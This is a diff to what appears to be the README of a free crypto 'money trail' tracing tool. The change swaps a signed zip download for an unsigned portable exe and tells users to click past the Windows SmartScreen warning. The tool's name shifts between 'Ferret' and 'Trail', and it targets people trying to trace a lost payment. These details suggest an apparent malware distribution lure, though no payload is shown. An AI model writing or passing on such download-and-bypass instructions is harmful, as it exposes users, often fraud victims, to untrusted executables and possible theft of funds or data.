@@ -56,12 +56,11 @@ Free. On your PC. No account. Ferret never asks you for money.
 
 
 
-1. Download [`onchain-money-trail-analyzer.zip`](https://github.com/Signcluengine/onchain-money-trail-analyzer/releases/latest/download/onchain-money-trail-analyzer.zip) and start it. No installer, no admin rights.
+1. Download [`Trail-1.9.3-portable-x64.exe`](https://github.com/Signcluengine/onchain-money-trail-analyzer/releases/latest/download/Trail-1.9.3-portable-x64.exe) and start it. No installer, no admin rights.
 
-Unpack the whole folder and start `Main.exe`. No installer, no admin rights.
+Download and start the exe. No installer, no admin rights.
 
-`Main.exe` is code-signed, so Windows starts it without a warning. Keep
-`Trail` next to it: they ship together.
+The build is not code-signed yet, so SmartScreen may warn once: choose **More info**, then **Run anyway**.
 2. Paste the address you paid, or the hash of your payment, and press **Trace**.
 
 > [!NOTE]
